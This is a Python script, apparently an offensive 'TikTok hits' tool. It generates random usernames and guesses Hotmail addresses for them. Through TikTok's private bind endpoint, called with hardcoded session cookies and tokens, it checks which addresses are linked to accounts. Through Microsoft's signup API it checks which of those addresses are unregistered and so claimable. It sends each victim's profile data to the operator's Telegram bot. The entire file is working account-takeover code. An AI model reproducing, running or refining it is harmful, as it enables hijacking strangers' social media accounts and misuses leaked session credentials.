import os
try:
  from ms4 import TikTok, InfoTik
  import random
  import threading
  import requests
  from rich.console import Console
  from rich.table import Table
  from rich.text import Text
  import time
  from user_agent import generate_user_agent  
  import requests 
  import uuid 
  import hashlib
  import json
  from time import time
  from random import choice
  from copy import deepcopy
  import re
except:
  os.system("pip install ms4 rich user_agent")

import hashlib
import json
from time import time
from random import choice
from copy import deepcopy
import requests 
import uuid 
from ms4 import TikTok, InfoTik
import random
import threading
import requests
from rich.console import Console
from rich.table import Table
from rich.text import Text
import os
import time
import requests
import os
import time
from user_agent import generate_user_agent  
import random
import string
from secrets import token_hex
import re
E = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m'
M = '\x1b[1;37m'
B = '\x1b[38;5;208m'
memo = random.randint(100, 300)
O = f'\x1b[38;5;{memo}m'

def nx():
    os.system("clear")
    Banner = f"""{B}{E}=============================={B}
|{F}[+] TeleGram   : {B} Abdullha_404   
|{F}[+] GitHub  : {B} xylon-404 
|{F}[+] Tool       : {B} VIP TIKTOK
{E}==============================
"""
    for mm in Banner.splitlines():
        time.sleep(0.05)
        print(mm)

nx()

token = input(f' {F}({M}1{F}) {M} Enter Token{F}  ' + O)
print(X + ' ═════════════════════════════════  ')
ID = input(f' {F}({M}2{F}) {M} Enter ID{F}  ' + O)

console = Console()
bb = 0
gg = 0
bm = 0
gm = 0
hit = 0


def tlg(email):
    global hit
    username = email.split('@')[0]  
    try:
        hit += 1
        info = InfoTik.TikTok_Info(username)      
        secid = info.get("secuid", "")
        name = info.get("name", "")
        followers = info.get("followers", "")
        following = info.get("following", "")
        like = info.get("like", "")
        video = info.get("video", "")
        private = info.get("private", "")
        countryn = info.get("country", "")
        countryf = info.get("flag", "")
        cdt = info.get("Date", "")
        id = info.get("id", "")
        bio = info.get("bio", "")
        kls = f"""───────────────\n⎌ Email ➢ {email} \n⎌ ᴜѕᴇʀɴᴀᴍᴇ ➢ {username} \n⎌ ѕᴇᴄᴜɪᴅ ➢ {secid} \n⎌ ɴᴀᴍᴇ ➢ {name}\n⎌ ғᴏʟʟᴏᴡᴇʀѕ ➢ {followers} \n⎌ ғᴏʟʟᴏᴡɪɴɢ ➢ {following}\n⎌ ʟɪᴋᴇ ➢ {like}\n⎌ ᴠɪᴅᴇᴏ ➢ {video}\n⎌ ᴘʀɪᴠᴀᴛᴇ ➢ {private}\n⎌ ᴄᴏᴜɴᴛʀʏ ➢ {countryn} {countryf}\n⎌ ᴄʀᴇᴀᴛᴇᴅ ᴅᴀᴛᴇ ➢ {cdt}\n⎌ ɪᴅ ➢ {id}\n⎌ ʙɪᴏ ➢ {bio}\n─────────────── BY ➢ @Abdullha_404 - CH ➢ @Abdullha_404"""        
        requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={kls}')
    except:
        error_message = f'''
        صاد لك حساب بدون ما اعطا معلومات
        Email >> {email}
        User >> {username}      
        BY : @Abdullha_404 | @Abdullha_404
        '''        
        requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={error_message}')
        
 


def check_live_signup(email):
    try:
        if '@hotmail.com' in email or '@outlook.com' in email or '@outlook.sa' in email:
            try:
                with open("hotmail_req.txt", "r") as f:
                    for line in f:
                        mc, ca = line.strip().split('Π')
            except FileNotFoundError:
                GetHot()
                with open("hotmail_req.txt", "r") as f:
                    for line in f:
                        mc, ca = line.strip().split('Π')

            cookies = {
                'mkt': 'ar-YE',
                'MicrosoftApplicationsTelemetryDeviceId': f'{uuid.uuid4()}',
                'MUID': f'{token_hex(8) * 2}',
                'mkt1': 'ar-AR',
                'ai_session': 'CyuLoU6vSi7HJzZeYNyVoH|1709731817506|1709731817506',
                'amsc': f'{mc}',
                'clrc': '{%2219789%22%3a[%22+VC+x0R6%22%2c%22FutSZdvn%22%2c%22d7PFy/1V%22]}',
            }
            headers = {
                'authority': 'signup.live.com',
                'accept': 'application/json',
                'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
                'canary': f'{ca}',
                'content-type': 'application/json',
                'hpgid': '200639',
                'origin': 'https://signup.live.com',
                'referer': f'https://signup.live.com/signup?mkt=AR-AR&lic=1&uaid={uuid.uuid4()}',
                'scid': '100118',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'tcxt': 'VWlP20OW8k/xH6tFupQw1HwrEFETf+tDxcIS0OeqhsBSbBIMy4srnqBeqY1i2lMA5VbPfXSuTUEhdSw9AWoPPSNJeuzfyYceefIZ/1EGoBqppRyXgczQuaM5teemKuAKiUXDaBYMj8Ng8fhejlVVuQmHCBl+PgEGlG7A/8uqXNwqIlrg9tbOqIzHkn5X1jUytMlmFxmEjdLCQnainFfCoxqgPZjkQwcE6hQFElIuxniqWRWk6lmEleIPwhGFID2kbSE5kxjiT5eoUt/S5zxP2a1Yp+shu8ITJrys5pkwMbsWO+L18h8bH4+BG3LFLJk00zd28yeJz7uTq3NRNR1uK+OiCVwGdB5JhxmvsItOIwHc83/xeN0XuTlXGgueChmPKulABKjR4v0VDkutbyPQwRVqRPRALfutQaEjOXdx9FXOCUTySJLtPpeMPIj172+PUSlBhgueKn3Iiz2mzKbR8Kv4JgBlQF5m3dVYyNpSN998fVQE3x94ruAsioYwEOBdfEViB34QpbzAuNfoNmNisCvzI9PKzc+cDKeWkcVd7OtYQSR0AR2Ibr6LE0iulNI5/zqg/BYp3Vf2zaExAmpf8Q==:2:3',           
                'uaid': f'{uuid.uuid4()}',
                'uiflvr': '1001',
                'user-agent': generate_user_agent(),
                'x-ms-apitransport': 'xhr',
                'x-ms-apiversion': '2',
            }
            params = {
                'mkt': 'AR-AR',
                'lic': '1',
                'uaid': f'{uuid.uuid4()}',
            }
            data = {
                'signInName': f'{email}',
                'uaid': f'{uuid.uuid4()}',
                'includeSuggestions': True,
                'uiflvr': 1001,
                'scid': 100118,
                'hpgid': 200639,
            }

            req = requests.post('https://signup.live.com/API/CheckAvailableSigninNames', params=params, cookies=cookies, headers=headers, json=data).text
            if '"isAvailable":true,' in req:
                gm += 1
                tlg(email)
            elif '"isAvailable":false,' in req:
                bm += 1
            else:
                bm += 1
                GetHot()
        else:
            print(" Erorr..!")

    except Exception as e:
        print(e)
        GetHot()


def GetHot():
    try:
        headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'upgrade-insecure-requests': '1',
    'user-agent': generate_user_agent(),
        }
        response = requests.get('https://signup.live.com/signup', headers=headers)
        canary=str.encode(response.text.split('"apiCanary":"')[1].split('"')[0]).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
        mc=response.cookies.get_dict()['amsc']
        cookies = {
    'amsc': mc,
}
        headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'canary': canary,
    'content-type': 'application/json; charset=utf-8',
    'origin': 'https://signup.live.com',
    'referer': 'https://signup.live.com/',
    'user-agent': generate_user_agent(),
}
        json_data = {
    'clientExperiments': [
        {
            'parallax': 'enableplaintextforsignupexperiment',
            'control': 'enableplaintextforsignupexperiment_control',
            'treatments': [
                'enableplaintextforsignupexperiment_treatment',
            ],
        },
    ],
}
        response = requests.post(
    'https://signup.live.com/API/EvaluateExperimentAssignments',
    cookies=cookies,
    headers=headers,
    json=json_data,
).json()
        try:
            ca=response['apiCanary']
        except Exception as e:
             print(e)       
             GetHot()


        try:
            os.remove('hotmail_req.txt')
        except:
            pass

        with open('hotmail_req.txt', 'a') as t:
            t.write(f"{mc}Π{ca}\n")

    except Exception as e:
        print(e)
        GetHot()



           
def check_tiktok(email):
    global bb, gg
    try:        
        tik = TikTok.CheckTik(email)['Is_Available']        
        if tik == 'true':
            gg += 1
            check_live_signup(email)
        else:
            bb += 1
    except:       
        bb += 1
    
    






def Aegos(email):
    global gg, bb
    sis = str(uuid.uuid4()).replace('-', '')
    url =f'https://api22-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/?passport-sdk-version=19&iid=7372841843832473349&device_id=7194351170030650885&ac=WIFI&channel=googleplay&aid=1233&app_name=musical_ly&version_code=310503&version_name=31.5.3&device_platform=android&os=android&ab_version=31.5.3&ssmix=a&device_type=Infinix+X6816&device_brand=Infinix&language=en&os_api=30&os_version=11&openudid=3293d1a6e9361cb7&manifest_version_code=2023105030&resolution=720*1568&dpi=303&update_version_code=2023105030&_rticket=1722418820230&is_pad=0&current_region=IQ&app_type=normal&sys_region=IQ&mcc_mnc=41805&timezone_name=Asia%2FBaghdad&carrier_region_v2=418&residence=IQ&app_language=en&carrier_region=IQ&ac2=wifi5g&uoo=0&op_region=IQ&timezone_offset=10800&build_number=31.5.3&host_abi=arm64-v8a&locale=en&region=IQ&content_language=en%2C&ts=1722418819&cdid=556d8162-2721-4760-a509-a92b3cf27738&support_webview=1&cronet_version=2fdb62f9_2023-09-06&ttnet_version=4.2.152.11-tiktok&use_store_region_cookie=1'
    headers = {
                'User-Agent': "com.zhiliaoapp.musically/2023105030 (Linux; U; Android 10; ar; JSN-L22; Build/HONORJSN-L22; Cronet/TTNetVersion:2fdb62f9 2023-09-06 QuicVersion:bb24d47c 2023-07-19)",
                'x-tt-multi-sids': "7244263196788589573%3A2d2c64d5b9a84a83e99bcb51271fb05d",
                'sdk-version': "2",
                'x-bd-kmsv': "0",
                'x-tt-token': "032d2c64d5b9a84a83e99bcb51271fb05d018e06f3998ef8a2cebb5e435736eeaa137afdbf072731d98083650d11370e5d3143cadb7a8643febe4e3f3e212bc1d8031ef99ac847f59944de00c13e7b4ba1d784fd20ec289b1a82c538d53b85530142c-CkAxNWMyOWY1MjRiZWQ5NTVjMDFhNjcwZDBjZmJkNjdlMjhiYmFkNDU1MDlmZmI1ZTdiNDUzNjc3YmZhOGFhNTEx-2.0.0",
                'x-ss-req-ticket': "1724143814731",
                'multi_login': "1",
                'x-tt-passport-csrf-token': "ee8d571c5f8416fdf751859e04ac0ad9",
                'passport-sdk-version': "19",
                'x-tt-dm-status': "login=1;ct=1;rt=1",
                'x-vc-bdturing-sdk-version': "2.3.3.i18n",
                'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
                'x-ss-stub': "D262610E98D24EF465AA71E6A097CF5D",
                'x-ss-dp': "1233",
                'x-tt-trace-id': "00-6efac9ee1066a4dfacf15306062704d1-6efac9ee1066a4df-01",
                'x-argus': "bxXR7LRluRVi4V9JqQedEaYLIa3vWo2w1dLzN2YTVq0iRq1hykdgtDp+5Fl822k0wZs+Wc2CB3ZxCzZXcwBJV32hLfGBKmeAREs1GsB18eWQvBvtJix7ofOmchDpoiITcD5lOVFeVhYnIyGD566J6BxYgRt5AnffkxtdG+iHXeB+K9FmxpLi65UaQiMgo/SSvsT5jlHwAPI18Mzb29y/30i8xH5RQ2gGY2Dwb0husl77s53e80z9FdxqVkU3gOQ2fUZls6CcNa9Na+rmdjlxsYrtN3wK6IJwihHkPiKeVpp/qbxxo7hkKH2wQQMDpOsQ9voCyFXjZloYawTd3nLDAuv+4t4sTsD0uV4b8L9oxhp5sNfwEGQ9I4C9v2rT8dWjLTc9Ypmlq3BYXCo4Fv5/4vnzwlAjWhleIpVVkuJu4cVl4V7CdZz8610h7uz7f0c4m7QjehGO5Auek/saLoiyEyxz7ETVHQBhxZPAWp0roGBgKUNk++44TqFh1/O481W+bkaMuJwcbTP5DKo+JHIQZ+GyEMT6Avp+tp5FjZgd3SHyf42K6bTJkGRktYpo9PPJVL/jOmoCJaIGwpqvRPnVvpDqYZRYuTe89cbL1VS/YHPeeBSBMFHX2XoBLtbRD+Ys0FE=",
                'x-gorgon': "8404c0c2100001af2c41ffe6895b664c319707c5a8668a4f1214",
                'x-khronos': "1724230210",
                'x-ladon': "xwZIesnERjW/UuJrHJxbf8xohz9Ah16FyPN2MgAQXD78FU25",
                'Cookie': f"d_ticket=db235bee19a1476e2ef95518d7a2dee83ec0d; multi_sids=7244263196788589573%3A2d2c64d5b9a84a83e99bcb51271fb05d; cmpl_token=AgQQAPOnF-RPsLS2JFlgN908_MVGn17MP4QsYNXyiQ; uid_tt=c54c21eceaa2ebb88b3a456e7842cd5262f130c02abe4dd630c8470cb86bae6b; uid_tt_ss=c54c21eceaa2ebb88b3a456e7842cd5262f130c02abe4dd630c8470cb86bae6b; sid_tt={sis}; sessionid={sis}; sessionid_ss={sis}; store-idc=alisg; store-country-code=iq; store-country-code-src=uid; tt-target-idc=useast1a; passport_csrf_token=ee8d571c5f8416fdf751859e04ac0ad9; passport_csrf_token_default=ee8d571c5f8416fdf751859e04ac0ad9; install_id=7403493772548310790; ttreq=1$58be297161337571038dfa70fc0073b16be6df3b; sid_guard=2d2c64d5b9a84a83e99bcb51271fb05d%7C1724008592%7C15552000%7CFri%2C+14-Feb-2025+19%3A16%3A32+GMT; odin_tt=93f3b994509ee8d4a9a6719c29884e8058d3311aa04bffd5f8a8e36827f81fff9b80bf53f6f7604c325532e7dd0e75685e2bea61f0601f6bd5c22601cc0ff4fb2c637d19a6e60e7da3a46a1361658e31; msToken=I0STMc-_BNKhyh_k1FEFXAplbxMJM0OKZuwQZgtr-BVGH_zTOFKO3TJ2M6GhZax2K_fGTtPGCw3mspX8NZrIGQCS9eSQ1BUMYlILQA5m8bnvvv4scZTeDwwrhWL3"
            }
            
    data = {
                "account_sdk_source": "app",
                "multi_login": "1",
                "email_source": "9",
                "email": email,
                "mix_mode": "1"
            }
            
            
    try:         
      res = requests.post(url,headers=headers,data=data).text
      if "Email is linked to another account. Unlink or try another email." in res:
          gg += 1
          check_live_signup(email)        
      elif "Account is already linked" in res:
          bb += 1
      else:
          check_tiktok(email)
    except:
        check_tiktok(email)
 
    os.system('clear') 
    table = Table(title=f"{O}TIKTOK HITS")
    table.add_column("Type", justify="center", style="cyan", no_wrap=True)
    table.add_column("Count", justify="center", style="magenta")
    table.add_row("Hits", Text(str(hit), style="green"))
    table.add_row("GoodTikTok", Text(str(gg), style="yellow"))
    table.add_row("BadTikTok", Text(str(bb), style="red"))
    table.add_row("GoodEmail", Text(str(gm), style="blue"))
    table.add_row("BadEmail", Text(str(bm), style="red"))
    table.add_row("Emails", Text(str(email), style="white"))
    table.add_row("Dev", "XYLON ~~ @Abdullha_404")
    console.print(table)

    
    



	   


    
def SerTikTok():       
    while True:
        kill = random.choice([
            'دجحخهعغفقثصضشسيبلاتنمكطظزوةىلؤءئ',  
            '1234567890azertyuiopmlkjhgfdsqwxcvbn',  
            'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
            'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
            'ABCÇDEFGĞHIİJKLMNOÖPRSŞTÜVYZ',  
            'АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ',  
            'अआइईउऊऋएऐओऔकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',  
            'ابپتثجچحخدذرزژسشصضطظعغفقکگلمنوهی'
            'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
            'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',
            'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',
            'ㅏㅐㅑㅒㅓㅔㅕㅖㅗㅘㅙㅚㅛㅜㅝㅞㅟㅠㅡㅢㅣㄱㄲㄴㄷㄸㄹㅁㅂㅃㅅㅆㅇㅈㅉㅊㅋㅌㅍㅎ'
        ])   
        key = ''.join((random.choice(kill) for _ in range(random.randrange(3, 15))))
        rng = int("".join(random.choice("6789") for _ in range(1)))
        name = "".join(random.choice("1234567890qwertyuiopasdfghjklzxcvbnm.") for _ in range(rng))
        names = random.choice([name, key])  
        res = requests.get(f"https://api-ahmed-4a5f30f71b71.herokuapp.com/searchtiktok={names}").json()  
        if "Users" in res:
            for user in res["Users"]:
                email = user + "@hotmail.com"
                Aegos(email)
        else:
            print('bad')

threads = []
for i in range(3):
    t = threading.Thread(target=SerTikTok)
    threads.append(t)
    t.start()
for t in threads:
    t.join()
